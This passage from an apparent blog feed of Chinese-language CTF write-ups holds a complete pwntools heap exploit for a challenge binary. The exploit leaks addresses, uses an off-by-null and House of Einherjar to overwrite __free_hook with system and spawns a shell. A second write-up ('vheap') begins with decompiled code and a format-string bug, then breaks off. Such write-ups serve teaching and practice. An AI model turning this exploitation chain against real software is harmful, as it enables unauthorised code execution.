class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#!/usr/bin/env python3<br># -*- encoding: utf-<span class="hljs-number">8</span> -*-<br><br>from pwn import<span class="hljs-operator"> *</span><br><span class="hljs-operator"></span><br><span class="hljs-operator"></span>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    p = remote(&#x27;&#x27;,)<br>    libc = <span class="hljs-constructor">ELF(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">home</span><span class="hljs-operator">/</span><span class="hljs-params">sh0ve1</span><span class="hljs-operator">/</span><span class="hljs-params">glibc</span>-<span class="hljs-params">all</span>-<span class="hljs-params">in</span>-<span class="hljs-params">one</span><span class="hljs-operator">/</span><span class="hljs-params">libs</span><span class="hljs-operator">/</span>2.31-0ubuntu9.7_amd64<span class="hljs-operator">/</span><span class="hljs-params">libc</span>-2.31.<span class="hljs-params">so</span>&#x27;)</span><br><span class="hljs-keyword">else</span>:<br>    p = process(&#x27;./pwn&#x27;)<br>    libc = <span class="hljs-constructor">ELF(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">home</span><span class="hljs-operator">/</span><span class="hljs-params">sh0ve1</span><span class="hljs-operator">/</span><span class="hljs-params">glibc</span>-<span class="hljs-params">all</span>-<span class="hljs-params">in</span>-<span class="hljs-params">one</span><span class="hljs-operator">/</span><span class="hljs-params">libs</span><span class="hljs-operator">/</span>2.31-0ubuntu9.7_amd64<span class="hljs-operator">/</span><span class="hljs-params">libc</span>-2.31.<span class="hljs-params">so</span>&#x27;)</span><br><br>elf = <span class="hljs-constructor">ELF(&#x27;.<span class="hljs-operator">/</span><span class="hljs-params">pwn</span>&#x27;)</span><br><br>def <span class="hljs-constructor">JoinGame()</span>:<br>    p.sendlineafter(<span class="hljs-string">&quot;Select Your Choice:&quot;</span>,<span class="hljs-character">&#x27;1&#x27;</span>)<br><br>def <span class="hljs-constructor">JoinGame_Challenge()</span>:<br>    p.sendlineafter(<span class="hljs-string">&quot;4. Return to Main Menu\n\n&quot;</span>,<span class="hljs-character">&#x27;1&#x27;</span>)<br><br>def <span class="hljs-constructor">JoinGame_Magic(<span class="hljs-params">choice</span>)</span>:<br>    p.sendlineafter(<span class="hljs-string">&quot;4. Return to Main Menu\n\n&quot;</span>,<span class="hljs-character">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;4. Gain Infinity HP (Only GM)\n\n&quot;</span>,str(choice))<br><br>def <span class="hljs-constructor">JoinGame_GetDiary()</span>:<br>    p.sendlineafter(<span class="hljs-string">&quot;4. Return to Main Menu\n\n&quot;</span>,<span class="hljs-character">&#x27;3&#x27;</span>)<br><br>def <span class="hljs-constructor">SelectUser(<span class="hljs-params">idx</span>)</span>:<br>    p.sendlineafter(<span class="hljs-string">&quot;Select Your Choice:&quot;</span>,<span class="hljs-character">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Choose Which User?\n&quot;</span>,str(idx))<br><br>def <span class="hljs-constructor">PlayerManager()</span>:<br>    p.sendlineafter(<span class="hljs-string">&quot;Select Your Choice:&quot;</span>,<span class="hljs-character">&#x27;3&#x27;</span>)<br><br>def <span class="hljs-constructor">PlayerManager_AddUser(<span class="hljs-params">idx</span>,<span class="hljs-params">size</span>,<span class="hljs-params">cnt</span>)</span>:<br>    p.sendlineafter(<span class="hljs-string">&quot;Select Your Choice:&quot;</span>,<span class="hljs-character">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Select User Id\n&quot;</span>,str(idx))<br>    p.sendlineafter(<span class="hljs-string">&quot;Player Data Size\n&quot;</span>,str(size))<br>    p.sendafter(<span class="hljs-string">&quot;Input Data\n&quot;</span>,cnt)<br><br>def <span class="hljs-constructor">PlayerManager_EditUser(<span class="hljs-params">idx</span>,<span class="hljs-params">cnt</span>)</span>:<br>    p.sendlineafter(<span class="hljs-string">&quot;Select Your Choice:&quot;</span>,<span class="hljs-character">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Which Player To Change?\n&quot;</span>,str(idx))<br>    p.send(cnt)<br><br>def <span class="hljs-constructor">PlayerManager_DeleteUser(<span class="hljs-params">idx</span>)</span>:<br>    p.sendlineafter(<span class="hljs-string">&quot;Select Your Choice:&quot;</span>,<span class="hljs-character">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Which Player You Want To Delete:\n&quot;</span>,str(idx))<br><br>success(<span class="hljs-string">&quot;Getting the Permission ...&quot;</span>)<br><span class="hljs-constructor">JoinGame()</span><br><span class="hljs-constructor">JoinGame_Magic(2)</span> # 防止结果刚好为<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> True:<br>    <span class="hljs-constructor">JoinGame_Magic(1)</span><br>    data = p.recvuntil(<span class="hljs-string">&quot;1. Challange Torghast Tower!\n&quot;</span>)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;NO MORE MP&quot;</span> <span class="hljs-keyword">in</span> data:<br>        break<br><span class="hljs-constructor">JoinGame_Magic(4)</span><br><span class="hljs-constructor">JoinGame_Challenge()</span><br><span class="hljs-constructor">JoinGame_Challenge()</span><br><span class="hljs-constructor">JoinGame_Challenge()</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;4. Return to Main Menu\n&quot;</span>,<span class="hljs-character">&#x27;4&#x27;</span>)<br>success(<span class="hljs-string">&quot;Getted Successfully !!!&quot;</span>)<br><br>success(<span class="hljs-string">&quot;Leaking the heapbase and the libcbase ...&quot;</span>)<br><span class="hljs-constructor">PlayerManager()</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-constructor">PlayerManager_AddUser(<span class="hljs-params">i</span>,0xf0,<span class="hljs-params">b</span>&#x27;A&#x27;)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    <span class="hljs-constructor">PlayerManager_DeleteUser(<span class="hljs-params">i</span>)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    <span class="hljs-constructor">PlayerManager_AddUser(8-<span class="hljs-params">i</span>,0xf0,<span class="hljs-params">b</span>&#x27;\<span class="hljs-params">x00</span>&#x27;)</span><br><br><span class="hljs-constructor">PlayerManager_AddUser(8,0xe0,<span class="hljs-params">b</span>&#x27;A&#x27;)</span> # ?? 为啥<span class="hljs-number">0xf0</span>不行 fd为libc地址<br><br>p.sendlineafter(<span class="hljs-string">&quot;4. Back\n&quot;</span>,<span class="hljs-character">&#x27;4&#x27;</span>)<br><span class="hljs-constructor">SelectUser(7)</span><br><span class="hljs-constructor">JoinGame()</span><br><span class="hljs-constructor">JoinGame_GetDiary()</span> # leak the heapbase<br>p.recvuntil(<span class="hljs-string">&quot;Here Is The Adventure Log:\n&quot;</span>)<br>heapbase = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-character">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x700</span><br>success(hex(heapbase))<br><br>p.sendlineafter(<span class="hljs-string">&quot;4. Return to Main Menu\n&quot;</span>,<span class="hljs-character">&#x27;4&#x27;</span>)<br><span class="hljs-constructor">SelectUser(8)</span><br><span class="hljs-constructor">JoinGame()</span><br><span class="hljs-constructor">JoinGame_GetDiary()</span> # leak the libcbase<br>p.recvuntil(<span class="hljs-string">&quot;Here Is The Adventure Log:\n&quot;</span>)<br>libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-character">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecc41</span><br>success(hex(libc.address))<br><br># House <span class="hljs-keyword">of</span> Einherjar<br>p.sendlineafter(<span class="hljs-string">&quot;4. Return to Main Menu\n&quot;</span>,<span class="hljs-character">&#x27;4&#x27;</span>)<br><span class="hljs-constructor">PlayerManager()</span><br><span class="hljs-constructor">PlayerManager_AddUser(10,0x20,<span class="hljs-params">p64</span>(0)</span>+p64(<span class="hljs-number">0x61</span>)+p64(heapbase+<span class="hljs-number">0xbe0</span>)*<span class="hljs-number">2</span>) # fake chunk it&#x27;s fd <span class="hljs-keyword">and</span> it&#x27;s bk is the pointer <span class="hljs-keyword">of</span> the chunk10&#x27;s fd<br><span class="hljs-constructor">PlayerManager_AddUser(11,0x38,<span class="hljs-params">b</span>&#x27;B&#x27;)</span><br><span class="hljs-constructor">PlayerManager_AddUser(12,0xf0,<span class="hljs-params">b</span>&#x27;B&#x27;)</span><br><span class="hljs-constructor">PlayerManager_AddUser(13,0x30,<span class="hljs-params">b</span>&#x27;B&#x27;)</span> # 防合并<br><span class="hljs-constructor">PlayerManager_EditUser(11,<span class="hljs-params">b</span>&#x27;B&#x27;<span class="hljs-operator">*</span>0x30+<span class="hljs-params">p64</span>(0x60)</span>) # off-by-null<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    <span class="hljs-constructor">PlayerManager_DeleteUser(<span class="hljs-params">i</span>)</span> # 填满对应的tcachebin<br><span class="hljs-constructor">PlayerManager_DeleteUser(12)</span> # 触发house <span class="hljs-keyword">of</span> Einherjar 造成 <span class="hljs-number">10</span> 和 <span class="hljs-number">11</span> overlapping<br><br><span class="hljs-constructor">PlayerManager_DeleteUser(13)</span><br><span class="hljs-constructor">PlayerManager_DeleteUser(11)</span><br><span class="hljs-constructor">PlayerManager_AddUser(14,0x50,<span class="hljs-params">b</span>&#x27;B&#x27;<span class="hljs-operator">*</span>0x10+<span class="hljs-params">p64</span>(0)</span>+p64(<span class="hljs-number">0x41</span>)+p64(libc.sym<span class="hljs-literal">[&#x27;<span class="hljs-identifier">__free_hook</span>&#x27;]</span>)) # overlap -&gt; UAF -&gt; tcache poisoning<br><br><span class="hljs-constructor">PlayerManager_AddUser(15,0x30,&#x27;<span class="hljs-operator">/</span><span class="hljs-params">bin</span><span class="hljs-operator">/</span><span class="hljs-params">sh</span>\<span class="hljs-params">x00</span>&#x27;)</span><br><span class="hljs-constructor">PlayerManager_AddUser(1,0x30,<span class="hljs-params">p64</span>(<span class="hljs-params">libc</span>.<span class="hljs-params">sym</span>[&#x27;<span class="hljs-params">system</span>&#x27;])</span>)<br><span class="hljs-constructor">PlayerManager_DeleteUser(15)</span><br><br># gdb.attach(p)<br>p.interactive<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="0x5-Summary-1"><a href="#0x5-Summary-1" class="headerlink" title="0x5 Summary"></a>0x5 Summary</h3><p>2.29之后的off-by-null利用需要泄露堆地址（No PIE则无需泄露），用于设置伪造堆块的fd和bk为伪造堆块的用户区域地址</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/* consolidate backward */</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">prev_inuse</span>(p)) &#123;<br>      prevsize = <span class="hljs-built_in">prev_inuse</span> (p);<br>      size += prevsize;<br>      p = <span class="hljs-built_in">chunk_at_offset</span>(p, -((<span class="hljs-type">long</span>) prevsize));<br>      <span class="hljs-comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (<span class="hljs-built_in">chunksize</span>(p) != prevsize))<br>        <span class="hljs-built_in">malloc_printerr</span> (<span class="hljs-string">&quot;corrupted size vs. prev_inuse while consolidating&quot;</span>);<br>      <span class="hljs-built_in">unlink_chunk</span> (av, p);<br>    &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>UAF</tag>
      
      <tag>off-by-null</tag>
      
      <tag>house of einherjar</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwnhub-5月公开赛-vheap</title>
    <link href="/2022/05/16/Pwnhub-5%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B-vheap/"/>
    <url>/2022/05/16/Pwnhub-5%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B-vheap/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>逆向分析好难~~</p><h2 id="0x1-基本信息"><a href="#0x1-基本信息" class="headerlink" title="0x1 基本信息"></a>0x1 基本信息</h2><ul><li>libc-2.27.so (2.27-3ubuntu1.5_amd64)</li><li>file vheap : 64bit 动态链接 剥除符号表<br><code>vheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cbaf01a931b82c301cc6818963c21ff18c51b0ea, stripped</code></li><li>checksec vheap ： 保护全开<figure class="highlight avrasm"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure></li></ul><h2 id="0x2-程序分析"><a href="#0x2-程序分析" class="headerlink" title="0x2 程序分析"></a>0x2 程序分析</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs awk">__int64 __fastcall main(__int64 a1, char **a2, char **a3)<br>&#123;<br>  int v3; <span class="hljs-regexp">//</span> eax<br>  int v5; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">0</span>h] [rbp-<span class="hljs-number">70</span>h] BYREF<br>  int i; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">4</span>h] [rbp-<span class="hljs-number">6</span>Ch]<br>  int pieces; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">68</span>h]<br>  int size; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">64</span>h]<br>  char s[<span class="hljs-number">16</span>]; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">10</span>h] [rbp-<span class="hljs-number">60</span>h] BYREF<br>  __int64 v10; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">20</span>h] [rbp-<span class="hljs-number">50</span>h]<br>  __int64 v11; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">28</span>h] [rbp-<span class="hljs-number">48</span>h]<br>  __int64 v12; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">30</span>h] [rbp-<span class="hljs-number">40</span>h]<br>  __int64 v13; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">38</span>h] [rbp-<span class="hljs-number">38</span>h]<br>  __int64 v14; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">40</span>h] [rbp-<span class="hljs-number">30</span>h]<br>  __int64 v15; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">48</span>h] [rbp-<span class="hljs-number">28</span>h]<br>  __int64 v16; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">50</span>h] [rbp-<span class="hljs-number">20</span>h]<br>  __int64 v17; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">58</span>h] [rbp-<span class="hljs-number">18</span>h]<br>  unsigned __int64 v18; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">68</span>h] [rbp-<span class="hljs-number">8</span>h]<br><br>  v18 = __readfsqword(<span class="hljs-number">0</span>x28u);<br>  v5 = <span class="hljs-number">0</span>;<br>  i = <span class="hljs-number">0</span>;<br>  size = <span class="hljs-number">0</span>;<br>  strcpy(s, <span class="hljs-string">&quot;welcome:&quot;</span>);<br>  v10 = <span class="hljs-number">0</span>LL;<br>  v11 = <span class="hljs-number">0</span>LL;<br>  v12 = <span class="hljs-number">0</span>LL;<br>  v13 = <span class="hljs-number">0</span>LL;<br>  v14 = <span class="hljs-number">0</span>LL;<br>  v15 = <span class="hljs-number">0</span>LL;<br>  v16 = <span class="hljs-number">0</span>LL;<br>  v17 = <span class="hljs-number">0</span>LL;<br>  init_IO();<br>  puts(<span class="hljs-string">&quot;welcome to my vheap_001.&quot;</span>);<br>  puts(<span class="hljs-string">&quot;first,tell me your name.&quot;</span>);<br>  read(<span class="hljs-number">0</span>, format, <span class="hljs-number">8</span>uLL);<br>  sprintf(&amp;s[<span class="hljs-number">8</span>], format);                       <span class="hljs-regexp">//</span> 格式化字符串漏洞<br>  puts(s);                                      <span class="hljs-regexp">//</span> \x00截断<br>  puts(<span class="hljs-string">&quot;next,tell something?&quot;</span>);<br>  puts(<span class="hljs-string">&quot;How many pieces of data?&quot;</span>);<br>  pieces = get_long();<br>  <span class="hljs-keyword">if</span> ( pieces &lt; <span class="hljs-number">0</span> || pieces &gt; <span class="hljs-number">2</span> )               <span class="hljs-regexp">//</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br>  &#123;<br>    puts(<span class="hljs-string">&quot;don&#x27;t do it&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; pieces; ++i )                <span class="hljs-regexp">//</span> 分批次写入数据，每次<span class="hljs-number">0</span>x40 最多<span class="hljs-number">2</span>个<br>    read(<span class="hljs-number">0</span>, (char *)&amp;data + <span class="hljs-number">0</span>x40 * (__int64)i, <span class="hljs-number">0</span>x40uLL);<br>  puts(<span class="hljs-string">&quot;Size:&quot;</span>);<br>  size = get_long();<br>  printf(<span class="hljs-string">&quot;%d\n&quot;</span>, (unsigned int)size);<br>  <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">9</span> )                               <span class="hljs-regexp">//</span> 最多<span class="hljs-number">9</span>次<br>  &#123;<br>    puts(<span class="hljs-string">&quot;too long&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;???&quot;</span>);<br>  puts(<span class="hljs-string">&quot;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; size; ++i )                  <span class="hljs-regexp">//</span> 依次写入指令 初始化数组<br>  &#123;<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);                  <span class="hljs-regexp">//</span> 每个指令都是四字节 int<br>    Array1[i] = v5;<br>  &#125;<br>  init_Array2();                                <span class="hljs-regexp">//</span> Array2 不用管<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; size; ++i )<br>  &#123;<br>    v3 = get_Array1_v1();                       <span class="hljs-regexp">//</span> 从idx=<span class="hljs-number">0</span>开始依次读取Array1中存储的指令<br>    mainFunc(v3);                               <span class="hljs-regexp">//</span> 解析指令，并处理<br>  &#125;<br>  return <span class="hljs-number">0</span>LL;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>程序在一开始就存在一个格式化字符串漏洞，可用于泄露数据；</li><li>然后输入要写入的数据片段的个数，最多只能由有2个，然后再根据个数输入0x40的数据片段，这些数据片段只能写入一次，因此需要提前构造好数据；</li><li>然后输入Size，确定要执行的指令个数，最多只能有9个；</li><li>再根据指令个数，依次输入指令，将其存储到Array1数组中。每一个指令都是int型整数，结构如下：</li></ol><p><img src="https://note.youdao.com/yws/res/17814/WEBRESOURCEc39a453393c98833bfd0e81ddb756547" alt="指令结构"></p><ol start="5"><li>从idx&#x3D;0开始读取指令，然后传参给mainFunc函数解析并执行指令。由于是依次处理指令，因此指令输入顺序需要构造好。</li></ol><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">unsigned __int64 __fastcall main<span class="hljs-constructor">Func(<span class="hljs-params">int</span> <span class="hljs-params">num</span>)</span><br>&#123;<br>  unsigned __int64 v2; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br><br>  v2 = <span class="hljs-constructor">__readfsqword(0x28u)</span>;<br>  <span class="hljs-keyword">if</span> ( (num &amp; <span class="hljs-number">0x80</span>u) != <span class="hljs-number">0</span><span class="hljs-operator"> || </span>(<span class="hljs-built_in">char</span>)num &gt; <span class="hljs-number">2</span><span class="hljs-operator"> || </span>(num &amp; <span class="hljs-number">0x800000</span>) != <span class="hljs-number">0</span><span class="hljs-operator"> || </span><span class="hljs-constructor">SBYTE2(<span class="hljs-params">num</span>)</span> &gt; <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      puts(<span class="hljs-string">&quot;[+]error code!!!!&quot;</span>);<br>      puts(<span class="hljs-string">&quot;[+]warning!!!!!!!&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span> &gt; <span class="hljs-number">0x70</span>u )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xB0</span> )<br>    &#123;<br>      Array2<span class="hljs-literal">[SBYTE2(<span class="hljs-identifier">num</span>)]</span> = Array2<span class="hljs-literal">[SBYTE1(<span class="hljs-identifier">num</span>)]</span> ^ Array2<span class="hljs-literal">[(<span class="hljs-identifier">char</span>)<span class="hljs-identifier">num</span>]</span>;<br>      return <span class="hljs-constructor">__readfsqword(0x28u)</span> ^ v2;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span> &gt; <span class="hljs-number">0xB0</span>u )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xD0</span> )<br>      &#123;<br>        Array2<span class="hljs-literal">[SBYTE2(<span class="hljs-identifier">num</span>)]</span> = (__int64)Array2<span class="hljs-literal">[SBYTE1(<span class="hljs-identifier">num</span>)]</span> &gt;&gt; Array2<span class="hljs-literal">[(<span class="hljs-identifier">char</span>)<span class="hljs-identifier">num</span>]</span>;<br>        return <span class="hljs-constructor">__readfsqword(0x28u)</span> ^ v2;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xC0</span> )<br>        Array2<span class="hljs-literal">[SBYTE2(<span class="hljs-identifier">num</span>)]</span> = Array2<span class="hljs-literal">[SBYTE1(<span class="hljs-identifier">num</span>)]</span> &lt;&lt; Array2<span class="hljs-literal">[(<span class="hljs-identifier">char</span>)<span class="hljs-identifier">num</span>]</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xA</span> )                     <span class="hljs-comment">// 申请</span><br>    *((_QWORD *)&amp;heaparray + (<span class="hljs-built_in">char</span>)num) = malloc(<span class="hljs-constructor">SBYTE1(<span class="hljs-params">num</span>)</span>);<span class="hljs-comment">// malloc</span><br>  <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span> &gt; <span class="hljs-number">0x72</span>u )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xB1</span> )<br>    &#123;<br>      Array2<span class="hljs-literal">[SBYTE2(<span 